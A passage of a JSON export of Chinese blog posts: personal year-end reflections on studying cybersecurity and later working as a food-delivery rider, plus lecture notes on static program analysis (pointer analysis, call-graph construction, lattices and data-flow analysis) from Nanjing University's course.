[{"id":"f5007f3aea5d966647498ac576097a10","title":"黄袍加身了","content":"\n\n2024小结今年快完了，总结以下吧\n考网络安全研究生，没想到考英语感觉还好，考数学直接laxi\n感觉跟安全缘分已经结束了\n没想到现在直接黄袍加身了。。。。。。。。。。。。。。。。。。。。。。。\n当上了外卖小哥\n这行的确辛苦，大雨大雪往外送，都不带停，还老是时间不够就需要去闯红灯之类的\n长沙外卖行业比较发达，所以来这里尝试以下，上来夜跑两次差点摔s\n又刚好遇到这些天是大雨天，很难跑\n深刻体会劳动人民真的很辛苦，也是真的很光荣\n。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。\n不同的选择，不同的过程，相同的结果The safety time has come to a temporary end\n","slug":"黄袍加身了","date":"2024-01-19T15:55:52.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"92298a84822d559d47ab2ee2bbc333b9","title":"Apple名人堂","content":"\n\nApple名人堂哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈\nhttps://support.apple.com/zh-cn/HT201536\n\n\n","slug":"Apple名人堂","date":"2023-09-19T01:35:17.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"2abec977535af7e1f64404348cb2ae38","title":"2022完年总结","content":"\n\n2022年初进了鱼皮的星球，立下的flag\n\n一年过去了，回想一下今年的学习成果\n关于挖洞：审计出了几个0day，但是那全有手就行的。虽然洞不咋地，但是学习到了方法，有了自己的经验才是最重要的。\n唯一能拿出手的还是今年在edu上交的学某通的漏洞\n还记得开始学挖洞的时候为了够积分换已经挖到漏洞的那些学校的证书，挖了一个晚上的信息泄露，熬夜到眼睛爆炸，直接交了好几十个。最后得到的积分也就刚好够换一个。因为重复了。\n慢慢的总计起了套路，拿到泄露的信息，尝试弱口令登录，也找到了好几个。进去之后没有几个系统是正常的，都没啥子功能点。也就看账号的信息。。。往往一个弱口令可能需要花上一天的时间寻找。而且有的弱口令给的rank很低，后来干脆摆烂。。。\n后来感觉挖edu的洞没什么意思，就像找找企业的，结果因为没人带，自己又感觉技术学的太肤浅就没有尝试。捡到了一些漏洞，但是没有尝试去交。。。因为懒。\n因为菜，所以我就报名了小迪的培训。虽然目前学的比较少，但是补充了自己基础的不足。\n报名培训之前，还想过其他各种方法，找资源，找圈子。我一开始就找到了p牛的知识星球，但是没有识到真金。也是感觉自己的安全消息渠道基本上就是零，所以我就找了一堆付费星球，也看到了一堆一摸一样的技术知识。\n收集星球期间，还尝试过搭建自动化挖洞平台，挖hackone上的资产。也写过自己的信息处理小脚本。但是收益为-400+ 。因为同样的自动化挖到的漏洞东西，大佬能扩大漏洞危害，我连是什么漏洞都不知道，别说利用了。。。收获就是学了点自动化漏洞挖掘平台搭建的技术，现在看来也是有手就行。\n星球资源是有了。可是我的安全见识太浅薄，有很多的技术分享我完全看不懂。这个时候我意识到了可能需要找个师傅，系统的学习一下。\n然后，就是报名小迪的培训。比较系统的学习。当然，还白嫖了一些知名的xx的教程。也是看着学。\n基础有了，然后就是学习知名漏洞的复现也就是打法，学习知名漏洞的原理。在p牛的星球里学技术。自己尝试审计。总结一些小套路。到这基本上就是入门了。\n后面如何深入，我收集了一些深入方向：\n代码审计就去学开发，多多审计积累经验，尝试各种语言的审计，使用codeql审计等等\n挖洞就开始实战，最好是找人带，带入门了尝试自己独立挖洞作战。然后就是参加护网积累经验。\n网安是建立在实战基础上的，实战真的占大头。\n其他方向的没尝试过。深入也是看那些大佬在做的事情总结的。\n关于语言学习：学习过基础：go，Java，python\n写脚本：python\ngo写脚本现在有优势\n语言安全：Java\n看过了p牛的安全漫谈。学习过javasec里讲的内容，里面关于rasp的部分跳过了。这部分学的是漏洞原理和审计。\n在语言学习方面，总是心气浮躁，后期的学习老是眼高手低导致了一些问题。老实讲我学过好多语言基础，但是深入学习的基本没有，自己学会利用的不过就是python。不过我也不想往开发学。 （ 网络安全这个圈子，为什么需要挖洞的师傅自己有专业开发的水平呢？这难道也是潜规则？）\n脚本语言能写基础的脚本就入门了。也想写自己的扫描器，可是珠玉在前。重复造轮子没意义，但是造轮子的经验还是很重要的。所以，不自己原创，那就尝试读代码，并且将看到的好的代码自己利用，拼凑成自己的轮子。（这也是今年没完成的任务）\n关于实习：我在去实习之前真的真的意识到了自己的菜。因为家里人的劝说，以及自己迫切地想看看安全行业是什么样的情况。就跟同学一起尝试投了简历。很奇葩，我是直接去人家公司里交的简历，当场就面试。感受自己没戏了，结果通知下个星期去上班。。。。。。。\n也算是大致了解了安全界。\n期间最尴尬的就是，部门老大说要我和他开发小程序。。。当时立马收集一堆教程和源码，还好最后没叫我真干。（为什么搞安全的什么都要会！！！！）\n后来就是快毕业了，于是就离职了。\n还是因为自己的菜，让自己知道技术的重要性。接受不了那么菜的自己，决定花点时间好好学习一下。\n小结：一年里也算是学了很多东西，感觉这是大学几年里最努力的一年。\nflag一部分完成了，一部分未完待续，还有一部分还没开始。\n今年结束了，我也要暂时结束安全的学习生涯了。\n明年我要专心的备考。\n为了更好的学习。\n","slug":"2022完年总结","date":"2022-12-31T08:47:28.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"5074e20ed5dc02957701c5dc54f37c23","title":"南京大学软件分析--PA-FD","content":"\n\nB站教程地址：https://www.bilibili.com/video/BV1gg4y1z78p/?spm_id_from=pageDriver&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\n1：18：00\n英文文档地址：https://pascal-group.bitbucket.io/lectures/PTA.pdf   94页\nhttps://pascal-group.bitbucket.io/lectures/PTA-FD.pdf\nTai-e作业文档地址：https://tai-e.pascal-lab.net/intro/overview.html\n上节课最后还学了一点内容\nPA-FD：Pointer  Analysis Foundations\nPointer Analysis：RulesPointer-Affecting Statements\n首先学习前面4种语句的处理\nDomain and Notations***\n这些符号特别重要\nRules\nRule中横线上表示条件\nRule：New\n只要出现new语句，就添加到指针集当中。Oi表示语句i的指向对象。\nRule：Assign\ny指向什么，x就指向什么。所以只要Oi是属于pt(y)的就要加入pt(x)。\nRule：Store\n让x的Oi的某个f指针指向y的Oj\nRule：Load\n让x的对象Oi中的f指针指向y的对象Oj\nRules\nHow to Implement Pointer AnalysisOur Pointer Analysis Algorithms\nHow to Implement Pointer Analysis？\n\n事实上，指针分析是传播到指针（变量和字段）之间的指向信息\n作为解决指针包含约束系统的指针分析称为Andersen风格分析\n指针分析的关键是如何将已经变化的指针信息传播给于该指针相关的指针\n解决方法：\n使用图结构连接相关的指针\n当pt(x)改变，就传播改变的部分到x的后继\nPointer Flow Graph（PFG）\n\n程序的指针流图是一个有向图，表示对象如何在程序中的指针之间流动\n节点n表示抽象对象的变量或者字段\n边x-&gt;y表示指针指向的对象x可以流向（也可以指向）指针y\n图中的边是根据程序的声明和相应的规则添加的\nAn Example\n\nImplementing Pointer Analysis\n实现指针分析分为两步：\n\n建立指针流图\n传播指针指向信息\n\n这两步相互依赖。互相动态改变\nPointer Analysis：Algorithms\n红框全起来的就是指针分析的四条基本语句\nWorklist（WL）\nMain Algorithm\nHandling of New and Assign\n\n\nDifferential Propagation\n与原始集合相比，差集通常很小，因此只传播差集会提高效率\n此外，差集对于处理存储、加载和方法调用时的效率也很重要\nHandling of Store and Load\n可能引入新边是因为有可能其他的变量指向了同一个对象，而这个变量指向在之前已经处理过了\nReview\nAn Example\n不记得，就看PPT70页，有具体推导过程。视频1：20：多\n需要重新看一遍，注意力不是太集中\nReview\n必会知识点1：\n理解指针分析规则\n理解指针流图\n理解指针分析算法\n\nPointer Analysis with Method CallsPointer Anlysis in the Presence of Method Invocations\nCHA：基于声明的类型解析调用目标\n不精确，引入了错误的调用图边和关系\n指针分析：基于具体对象解析调用目标\n无论是调用图还是指向关系都比CHA更精确\nRule：Call\n\ndispatch 取决于Oi 的类型\n传receiver object \n传参数\n传返回值\n\n\nthis不加边，防止指向多个对象的时候产生了误判。就可能流向错误的对象\n\nInterprocedural Pointer Analysis\n和CHA分析过程类似，找进入主方法，之后通过主方法计算可到达的方法，在计算这些可到达的方法。这样可以优化速度。\nAlgorithms\n同CHA的改变很小\nAddReachable（m）\n开始加入，只处理new和assign语句\nload和store语句在后面处理\nProcessCall（x，Oi）\nAlgorihthms Output\nAn Example\n从PPT的126页开始，有具体的分析过程。\n视频里的ppt有点小问题，新版本的已经修改了，视频1小时\n必会知识点2：\n理解方法调用的指针分析规则\n理解程序间指针分析算法\n理解动态调用图规则\n\nPA-FD：Pointer  Analysis Foundations\nPointer Analysis：RulesPointer-Affecting Statements","slug":"南京大学软件分析-PA-FD","date":"2022-12-29T07:29:48.000Z","categories_index":"软件分析","tags_index":"Java","author_index":"Longw"},{"id":"4063b5a2c98c833f090c95343895b35d","title":"南京大学软件分析--PA","content":"\n\nB站教程地址：https://www.bilibili.com/video/BV1gg4y1z78p/?spm_id_from=pageDriver&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\n英文文档地址：https://pascal-group.bitbucket.io/lectures/PTA.pdf\nTai-e作业文档地址：https://tai-e.pascal-lab.net/intro/overview.html\nPA：Pointer  Analysis\nMotivationProblem of CHA\n用前面学的CHA算法分析n.get()调用，会得到NAC的结果。然而，事实上只会调用One的get()方法，会返回1。所以这个结果是不准确的。\nVia Pointer Analysis\n因为CHA算法只考虑声明类型，所以得到的结果不准确。而指针分析则会考虑实际的类型，也就是new One()。所以会得到精确的结果。这就是为什么需要指针分析。\nIntroduction to Pointer AnalysisPointer Analysis\n\n静态分析的基础：计算内存中指针的指向\n\n对于如Java一样的oop语言\n计算对象的指针（变量和filed）的指向\n\n被视为是may-analysis\n计算指针可以指向哪些对象\n\n\n后面是一篇论文，提出关于指针分析，也是为了处理过程间分析的问题。\nExample\n\n\n指针分析处理的是这些调用发生时，对象和field的指针指向\nPointer Analysis and Alias Analysis\n指针分析：对象指针的指向\n别名分析：两个指针指向同一个对象\n下面是别名分析的一个列子\n别名信息是能够通过指针分析的结果得出来的\nApplications of Pointer Analysis\n指针分析的应用：\n\n基础信息：\n调用图，别名等\n\n编译优化：虚拟调用内联等\n\n检查bug：空指针检查等\n\n安全分析：\n信息流分析等\n\n等等更多\n\n\n指针分析可以说是静态分析的最基础，几乎所有其他的分析都建立在指针分析的基础上。\nKey Factors of Pointer Analysis\n四个要素，都解决了某一个问题，都是一个分析方向。\nHeap Abstraction\n如何对堆进行建模？\n\n在动态执行过程中，由于循环和递归，堆对象的数量可以是无限的\n为了确保终止，堆抽象模型将动态分配的无限具体对象作为静态分析的有限抽象对象\n\n这样有限的处理就可以终止\n\n有两大流派：\n\nStore based model\nStoreless model\n\n下面的课程只学习1下面的Allocation sites技术\n因为这个技术是目前最有用的关于堆抽象的技术\nAllocation-Site Abstraction\n用一个列子说明：在那个for循环动态执行的过程中，不停的创建一个A对象，我们直接将这些相同的具体对象抽象为一个对象\n因为在程序中这些具体的对象是有限的，所以抽象的对象必定是有限的。程序就能够终止。\n就是代码中有几个new语句，静态分析时就处理几个抽象对象\nContext Sensitivity\n如何对上下文调用建模？\n上下文敏感性\n上下文敏感\n比如foo方法在两个地方调用，分成两个上下文。分别进行处理，实参x只会传入上下文1，实参y只会传入上下文2。\n同一个方法，根据上下文的不同，将其分开分析。\n上下文不敏感\n将同一个方法放在一起分析，这样会丢失精度\nFlow Sensitivity如何对控制流建模？\n\n也是分为控制流敏感和不敏感\n从课程开始到现在学习的控制流分析都是属于敏感分析\n蓝色是指针分析基于流敏感的，另一个是指针分析基于流不敏感\n不敏感只会增加指针集，敏感则会删除一些指向\n对于Java这门语言，没有研究结果表明，流敏感比流不敏感的结果精确很多。所以，这门课学习流不敏感。\nAnalysis Scope应该分析程序的那些部分？\n\n分为整个程序全部分析和及分析具体的某些对象\n整体分析能处理所有可能的需求，特定分析只满足一些需求\n某些情况下，特定分析不会快过于整体分析\n这节课还学习整体分析。\nPointer Analysis in This Course\n红色表示主流，所以学习这个。\nConcerned StatementsWhat Do We Analysis\n只关注影响指针的语句，忽略其他不会影响指针的语句\nPointers in Java\n只学习1，3。2，4不直接学习，因为跟前一个的处理方式一样。\nPointer-Affecting Statements ***\n上面的语句都是重点。\n\n对于复杂的语句，会采用临时变量，将其简化为三地址码。\n\n前面两种调用好处理。后面只学习vitrual call，也就是说下面学习的程序全是virtual call。\n必会知识点：\n什么是指针分析\n理解影响指针分析的关键因素\n理解指针分析中需要分析的内容\n\n","slug":"南京大学软件分析-PA","date":"2022-12-26T08:37:30.000Z","categories_index":"软件分析","tags_index":"Java","author_index":"Longw"},{"id":"7c0ae3fae65c1cc802990d3363df7f00","title":"南京大学软件分析--IA","content":"\n\nB站教程地址：https://www.bilibili.com/video/BV1GQ4y1T7zm/?spm_id_from=pageDriver&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\n英文文档地址：https://pascal-group.bitbucket.io/lectures/Inter.pdf\nTai-e作业文档地址：https://tai-e.pascal-lab.net/intro/overview.html\nIA：Interprocedural  Analysis\nMotivation of Interprocedural Analysis：\n前面的过程分析时没有处理方法调用，太过于保守，就像模糊匹配一样，丢失了一些精度。\n所以，为了更好的精度。就需要过程间分析：传播数据流\n添加过程间的调用边，以及返回的边，在图上\n这样就能得到准确的值\n所以需要构造程序的调用图\nCall Graph：\n调用图就是调用点到目标方法形成的调用边的集合。（到i这里能联系到框架的设计上了）\nApplications of Call Graph：\n调用图的一些应用点。\nCall Graph Consruction for OOPLs（focus on Java）：\n图上四个算法从上到下精度越高，从下到上速度越快\n这节课学习：Class hierarchy analysis（CHA）\n下节课学习：Pointer analysis（k-CFA）\nMethod Calls （Invocations）in Java：\nJava中一般有三种调用。第四种前面章节讲的那个不考虑。\nx表示这种调用没有对象作为参数？？？（弹幕，不确定）\n在后面一个ppt直到了，就是调用对象\n关键难点在于处理virtual call\nMethod Dispatch of Virtual Calls：\n\n接收对象的类型\n调用点的方法签名\n\n在这个课程中，signature被称为方法的标识符\n\n定义函数dispatch（c，m）模拟运行时方法分配过程\n其中1是c，2是m（1是前面的1）\n有具体的m’就返回m’，没有就在父类找，之后找到具体的m’\nDispatch：An Example：\n第一个是A.foo()，找不到b中具体的方法就找父类A中的方法。\n第二个是C.foo()，在c中找到了具体方法，直接返回\nClass Hierarchy Analysis* （CHA）：\n这种分析需要整个程序的类层次结构信息（继承结构）\n基于调用点的声明接收变量类型解析virtual call\n假设接收变量a可以指向A类对象或A的所有子类，就通过查找A类层次结构来解析目标方法\nCall Resolution of CHA：\n\n\n\n通过CHA我们定义Resolve(cs)函数解决调用点cs的可能目标方法\n上图就是三种调用方式的情况\n对于第三种情况，直接将所有有关的子类（c和c的子类）都添加dispatch方法并把结果放到T中\nCHA：An Example：\n\n要是b语句是下面这种情况，还是一样的结果。因为CHA只考虑声明类型。\n同时也暴露了CHA的缺点，下面这种情况，是不会调用c和d类中的方法的。\n其实这个算法也是和前面一样的套娃，还是模糊匹配。\nFeatures of CHA：\nCHA的特点就很适合IDE的提示。\nCHA in IDE：\nCall Graph Construction：\n从main方法一直使用CHA找到能到达的方法添加边，之后没有产生新的可到达的方法，算法停止\nCall Graph Construction：Algorithm\n开始有一个进入方法也就是前面说的主方法，之后进行处理找到能到达的新方法，添加到worklist里面。一直处理完worklist里面的所有方法，算法停止，返回CG。\nCall Graph Construction：An Example\n开始主函数处理A.foo()，因为A.foo()是静态方法，所以只会添加A.foo()到worklist。接下来处理A.foo()里面的a.bar()，会添加A和A所有子类的bar()方法，所以是A.bar(),B.bar(),C.bar()。接下来就是啊。A.bar()里面的c.bar()，就只会添加C.bar()。之后就是前面添加的B.bar()，是空方法，不添加。之后就是C.bar()里面的A.foo()，找A和A的子类的foo方法，会找到A.foo()，没有新方法。不添加。worklist空了，算法停止。\nInterprocedural Control-Flow Graph：\nCFG表示单个方法的结构，ICFG表示整个项目的结构。通过ICFG可以进行过程间分析，程序的ICFG就是通过call site和return site附加多个CFG组成。\nICFG：An Example\n\n\nInterprocedural Data-Flow Analysis\nInterprocedural Constant Propagation\n新版ppt说的是将LHS变量（返回值）的处理留给edge transfer\n视频上说是要kill掉这个left hand side variable（左手边变量）\n后面的例子有清楚的过程\nInterprocedural Constant Propagation ：An Example\n\n\n\n有调用边和返回边还需要从上到下的边是应为方便传递本地变量。kill左值改变的，是因为防止其在下个输入变成NAC导致结果不精确。\n其中的调用边上的表达式就是call 的传递函数，返回边上的表达式就是return 的传递函数\nIntraprocedural Constant Propagation ：An Example以前的分析方式，两者做一个对比\n\n所以得出inter的精度超过了intra\n必会知识点：\n如何通过类层次分析构建调用图\n过程间控制流程图的概念\n过程间数据流分析的概念\n程序间常量传播\n\n","slug":"南京大学软件分析-IA","date":"2022-12-25T10:25:58.000Z","categories_index":"软件分析","tags_index":"Java","author_index":"Longw"},{"id":"e22c2a7c39f48bb60c2d574a9a534902","title":"南京大学软件分析--DFA-FD","content":"\n\nB站教程地址：https://www.bilibili.com/video/BV1A741117it/?spm_id_from=pageDriver&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\n英文文档地址：https://pascal-group.bitbucket.io/lectures/DFA-FD.pdf\nTai-e作业文档地址：https://tai-e.pascal-lab.net/intro/overview.html\nDFA-FD：Data Flow Analysis—–Foundations\nrecall the iteration algorithm：\nView iterative algorithm in another way：\n就是字面意思，解释算法的含义。节点数，迭代一次节点更新，定义值域，定义k元组，设置元素。。。。。以及算法运转和停下的条件。\n\n\n据说是离散数学的知识，X是公式的不动点，这个算法到达不动点，停止。\nAsk some question：\nPartial Order：\n定义一个偏序就是一个集合一个关系，集合满足关系则是偏序集。就是上面三个条件，自反性，反对称（直接看符号就清楚了），传递性。的确很像等价关系。。。\n偏序的意思是这个集合中并不是两两之间构成这个关系。\n给了下面几个列子判断，是否是偏序集：\n\n整数集S，关系&lt;=     是\n整数集S，关系&lt;     不是\n整个英语单词，关系是子字符串     是\n一个set的所有子set包括{}和自己，关系是子set   是\n\nUpper and Lower Bounds：\n按图中定义upper bound和lower bound。关系是子set，就是最多的set和空set\nupper bound的定义是大于等于，lower bound的定义是小于等于\n是在S里面全部进行比较\n\n\nlub是upper bound里面最小的，glb是lower bound里最小的\n是在S里面全部进行比较\n所以lower bound只有{}，因为S中{a}同{b}无法比较。\n就是形象点看箭头指向就行了。\nSome Properties：\n一些性质：\n\n不是所有的偏序集都有最小上限和最大下限\n如果偏序集有最小上限和最大下限，那一定是唯一的\n\n根据前面偏序集的第二个条件，证明，得出如果有俩个，那么这两个就是相等的\n\n一个偏序的集合中任意两个元素都有，最小上限和最大上限那么这个偏序就称为lattice\n判断是否是lattice：\n\n整数集S，关系&lt;=     是\n整个英语单词，关系是子字符串     不是，看箭头\n\n\n\n一个set的所有子set包括{}和自己，关系是子set   是\n\nSemilattice：\n前面是且的关系，这个是或的关系\nComplete Lattice：\n一个lattice的所有subset都有lub和glb，则这个lattice就是complete lattice\n判断下面例子是不是complete lattice：\n\n整数集S，关系&lt;=     无穷大，没有边界，不是\n一个set的所有子set包括{}和自己，关系是子set   是\n\n\n每一个有界的lattice是一个complete lattice。但是不是所有的complete lattice都是有界的lattice。\nProduct lattice：\nproduct lattice的定义。\n一个product lattice是lattice\n如果product lattice是complete lattice的乘积（每一个都是complete lattice），那么这个product lattice也是complete lattice\nData Flow Analysis Framework via Lattice：\n数据流分析框架有三个重要参数。D：表示数据流的方法，foreward或者backward。L：包含值V的域和满足n和u的lattice。F：从V到V的传递函数。\n数据流分析能看作是迭代应用传递函数和在lattice的值上的u/n操作\nPeview the questions we have seen befor：\n\n跟单调性有关\n函数有多个不动点，是不是最好的？\n\nMonotonicity  and Fixed-point Theorem：\n单调性：一个函数f：存在一个L是lattice，L是单调的，如果任意x，y属于L，上面公式\n不动点定理：一个complete lattice  L：（1）L是单调的且L是有限的，这个f函数通过f(⊥)迭代到达的不动点是最小不动点\n（2）L是单调的且L是有限的，这个f函数通过f(T)迭代到达的不动点是最大不动点\nFixed-point Theorem（Existence of Fixed Point）：\n\n\n\n不动点的性质已经证明了。但是，这不代表着迭代算法也有这种性质，所以，接下来要将两者关联起来。\nRelate Iterative Algorithm to Fixed-point Throrem：\n如果一个product lattice 是由一些complete（and finite）lattices组成，那么这个product latttice也是complete（and finite）。\n每一次迭代可以用F函数等价：（1）传递函数fi\n（2）meet/join函数 u/n\n现在需要证明F是单调的？\nProve Function F is Monotonic：\n其中传递函数fi是单调的，只需证明join/meet函数是单调的\n证明：任意x，y，z属于L，x #y（#表示图上符号)。想证明x u z # y u z通过u的定义，y#y u z\n通过transitivity #，x# y u z\n因为y u z是x的upper bound，也是z的upper bound 。所以x u z是x和z的least upper bound\n所以，x u z # y u z\n所以这个不动点定理应用在了数据流分析的迭代算法上。\n\nWhen Will the Algorithm Reach the Fixed Point？\n这个h表示从top到bottom的最长路径。这里是3。每一次迭代，假设仅仅考虑一步（前进一步或是后退一步）在一个node上。\n假设这个lattice的height是h，并且在CFG上的node数目是k\n那么最多需要 i =h*k 次迭代\n这个i是到达不动点的最大迭代数\n\nMay and Must Analysis，a Lattice View：记的不会太清楚，直接看那一段：30分钟多一点讲解\nhttps://www.bilibili.com/video/BV1964y1M7nL/?spm_id_from=pageDriver&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\n\nHow Precise Is Our Solution？\nMOP：满足所有路径的解决方案。\nMOP计算每条路径最终输出数据流值，并将join/meet应用于这些值，以找到 lub/glb\n一些路径可能不会被执行：不完全精确\n无边界，不可枚举：impractical\nOurs（Iterative Algorithm）vs. MOP：\n蓝色是迭代算法的处理流程，红色是MOP的处理流程\n\nMOP和Ours的关系，MOP更准确。前面的几个问题都是distributive，所以MOP=Ours\nConstant Propagation：\n给定程序点p处变量x，看x在p处是否保持恒定值\nCFG中每个节点OUT包含一组对(x,v)，x是变量，v是该节点之后x所保持的值\n是must\nConstant Propagation – Lattice：\n上面是关于meet之后的结果情况，其中UNDEF不是关注的重点\nConstant Propagation – Transfer Function：\n经过传递函数的实际的几种情况。\nConstant Propagation – Nondistributivity：\n这部分有点不清楚，看看别人笔记。\nWorklist Algorithm，an optimization of Iterative Algorithm：Review Iterative Algorithm for May &amp; Forword Analysis：\nWorklist Algorithm：\n只计算变化的IN/OUT，放到worklist里面遍历，直到worklist为空，说明到达不动点，算法停止。\n必会知识点：\n理解迭代算法功能图\nlattice和complete lattice的定义\n如何总结lattice中may和must分析\n理解不动点定理\nMOP于迭代算法产生的解之间的关系\n常量传播分析\nworklist algorithm\n\n作业二：Constant propagation and Worklist Solver\n先不要动，看完再想\n","slug":"南京大学软件分析-DFA-FD","date":"2022-12-24T08:54:03.000Z","categories_index":"软件分析","tags_index":"Java","author_index":"Longw"},{"id":"7843e3842ab5cae178372dfeef42c5ae","title":"南京大学软件分析--DFA-AP","content":"\n\nB站教程地址：https://www.bilibili.com/video/BV1oE411K79d/?spm_id_from=pageDriver&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\n英文文档地址：https://pascal-group.bitbucket.io/lectures/DFA-AP.pdf\nTai-e作业文档地址：https://tai-e.pascal-lab.net/intro/overview.html\nDFA-AP：Data Flow Analysis—–Applocations\nData Flow Analysis：\n大多数静态分析是may analysis，这部分分析的可能是正确的，也就是over-approximation。少部分是must analysis，这部分必须是分析正确的，所以是under-approximation。两者都是为了安全的分析，称为safe-approximation。\n\n不同的数据流分析应用有不同的数据抽象，不同的流安全近似策略。不同的传递函数和控制流处理。\nPreliminaries of Data Flow Analysis：Input and Output States：\nIR statement 每次执行都会从一个输入状态转化到一个新的输出状态。\n这个输入（输出）状态都与statement之前（之后）的program point相关联。\nIN[s1]经过s1 statement转化为了OUT[s1]，那么s2 statement的输入IN[s2]就是s1 statement的输出OUT[s1]。\n数据流就三种形式，直接传输，汇聚，分流。\n其中^ 符号是特定的处理符号，各不相同。\n\n在每一个数据分析应用中，我们将每个program point同数据流值相关联。这个数据；流值表示可以针对该点观察到的所有的程序状态集合的抽象。也就是前面的抽象步骤，将每个语句program point都抽象。这样一组数据流的值就算该程序的域。\n数据流分析的目的是为所有语句的输入输出状态找到一个safe-approximation directed constraints\n\nconstraints 基于statements的语义（传递函数）\nconstraints 基于控制流\n\nNotations for Transfer Function’s Constraints：\n为传递函数约束定义符号。也就将program point的输入经过statement变成输出的过程用数学表达式定义：\n\nForward Analysis\n\n\n\nBachward Analysis\n\n\nNotations for Control Flow’s Constraints：\n为控制流约束定义符号。就算将BB之间的输入输出用数学表达式表示：\n\nControl flow within a BB\n\n,for all i=1,2,…,n-1\n\nControl flow among BBs\n\n    \n,\nIN[b] = ^ P a predecessor of B OUT[P]\n这个^ 就算前面讲的汇聚流处理。\n反向：\n，\nOUT[B]= ^ S a successor of B IN[S]\nData Flow Analysis Applications：Issues Not Covered：\n就是下面没有涉及的内容，后面会学。\nReaching Definitions Analysis：\n关于reaching definition的定义：存在从pragram point p到orogram point q的路径，reaching definition d是p到q的路径上未被杀掉（比如重新赋值）\n也就是在p处有变量v，则v从p到q没有被重新定义（如赋值）。这个变量v就是为v赋值的statement。\n\n一个变量被使用之后能检测出来是否被初始化。给每一个变量一个伪定义。。。\n后面这段不好理解，不明白讲的什么意思。Understanding Reaching Definitions：\n是所有变量在程序中的定义，可以用byte vectors表示。\n!\n图中语句创建一个关于变量v的definition D，并且去掉了整个程序中其他关于v的定义，但是不影响其他输入的定义，x和y。\n这个Transfer Funciton用下面的公式表示：\n\n实列：\n\nControl Flow：\n!\nIN[B] = U P a predecessor of B OUT[P]\nAlgorithm of Reaching Definitions Analysis：!\nentry一般都为空，B\\entry是因为其他的初始化可能OUT[B]不为空，OUT[B]为空是因为may analysis一般情况都为空。must analysis一般为啥没听清楚好像是TOP（unkonw）。。。之后给每个basic block作一个control flow的约束。\n这个while真的会停吗？直接来个实际的列子：\n\n来一遍分析：\n前面说了，有几个定义就有几个byte，这里的0表示不能到达1表示到达，所以开始是00000000。分析算法开始都是赋值为0，开始输入为00000000，进入while循环，执行约束条件：\n第一轮循环：IN[B1]=00000000，OUT[B1]=11000000\nIN[B2]=11000000，OUT[B2]=10110000\n这里的IN[B2]要注意，是OUT[B4]和OUT[B1]的U，开始OUT[B4]=00000000，所以IN[B2]=OUT[B1]=11000000\nIN[B3]=10110000，OUT[B3]=00110010\nIN[B4]=10110000，OUT[B4]=00111100\nIN[B5]=OUT[B4] U OUT[B3]=00111110，OUT[B5]=00111011\n输出对比开始的全部00000000有变化，所以循环：\n第二轮循环：这里要注意的就是上一轮的OUT[B4]=00111100\nIN[B1]=00000000，OUT[B1]=11000000\nIN[B2]=OUT[B1] U OUT[B4]=11111100，OUT[B2]=10111100\nIN[B3]=10111100，OUT[B3]=00110110\nIN[B4]=10111100，OUT[B4]=00111100\nIN[B5]=OUT[B3] U OUT[B4]=00111110，OUT[B5]=00111011\n还是有变化，执行下一轮：\n第三轮循环：上一轮的OUT[B4]=00111100\nIN[B1]=00000000，OUT[B1]=11000000\nIN[B2]=OUT[B1] U OUT[B4]=11111100，OUT[B2]=10111100\nIN[B3]=10111100，OUT[B3]=00110110\nIN[B4]=10111100，OUT[B4]=00111100\nIN[B5]=OUT[B3] U OUT[B4]=00111110，OUT[B5]=00111011\n这一轮的输出同上一轮的输出完全相同，所以结束循环\n循环图：\nwhy this iterative algorithm can finally stop？这个statement都是一样的，所以当输入一样，输出就有一样，这个输入的变化是有限的，所以最后的输出也是有限的。（可能不对）还是看ppt\n\nSafe to terminate by this condition?达到了不动点，是安全的：\n!\nLive Variables Analysis：\nlive variables analysis能告诉我们p处的变量v在从p开始的某条路径是否使用。如果使用了就算live，否则就是dead。并且可以直到在这条路径中v没有被重新定义。\nlive variables information能用于寄存器的分配。在一些时候所有的寄存器都满了，我们需要使用，那么应该使用dead变量的寄存器。\nUnderstanding Live Variables Analysis：\n所有的变量在这个应用中，能够用bit vectors表示。和前面差不多。\n设计成backward算法：\n\n6种情况下，IN[B]的情况。\nAlgorithm of Live Variables Analysis：\nmay analysis一般为空，must analysis一般为TOP。\n类似前面的算法，当IN改变就循环。\n实列：\n\n这里的0表示dead，1表示live\n先看重定义再看使用，从下往上看\n第一轮循环：OUT[B5]=0000000，IN[B5]=0001000\nOUT[B3]=0001000，IN[B3]=1001000\nOUT[B4]=IN[B5] U IN[B2]=0001000，IN[B4]=0101000\nOUT[B2]=IN[B3] U IN[B4]=1101000，IN[B2]=1001001\nOUT[B1]=1001001，IN[B1]=0011101\n第二轮循环：上一轮IN[B2]=1001001\nOUT[B5]=0000000，IN[B5]=0001000\nOUT[B3]=0001000，IN[B3]=1001000\nOUT[B4]=IN[B5] U IN[B2]=1001001 ，IN[B4]=0101001\nOUT[B2]=IN[B3] U IN[B4]=1101001，IN[B2]=1001001\nOUT[B1]=1001001，IN[B1]=0011101\n第三轮循环：上一轮IN[B2]=1001001\nOUT[B5]=0000000，IN[B5]=0001000\nOUT[B3]=0001000，IN[B3]=1001000\nOUT[B4]=IN[B5] U IN[B2]=1001001 ，IN[B4]=0101001\nOUT[B2]=IN[B3] U IN[B4]=1101001，IN[B2]=1001001\nOUT[B1]=1001001，IN[B1]=0011101\n循环图：\nAvailable Expressions Analysis：\n这个（1）和（2)是啥呢？\n如果（1）从入口到p的所有路径都必须经过表达式x op y，并且（2）在x op y最后一次求值之后，没有重新定义x或y，则表达式x op y在p点可用。\n这意味着在p点，可以用表达式x的最后一次求值结果替换表达式x。\n可用表达式信息可用于检测全局公共子表达式。\nUnderstanding Available Expressions Analysis：\n所有表达式在程序中，能用bit vectors表示。\nforeward算法：\n\n右边的例子可以将表达式用t代替。\n先创建表达式，之后重新赋值就删除IN的所有包含重新赋值变量的表达式。\n为了safety，会产生误报，（must analysis-&gt;under-approximation）\n从入口到p的所有路径都要通过x op y的运算\nAlgorithm of Available Expressions 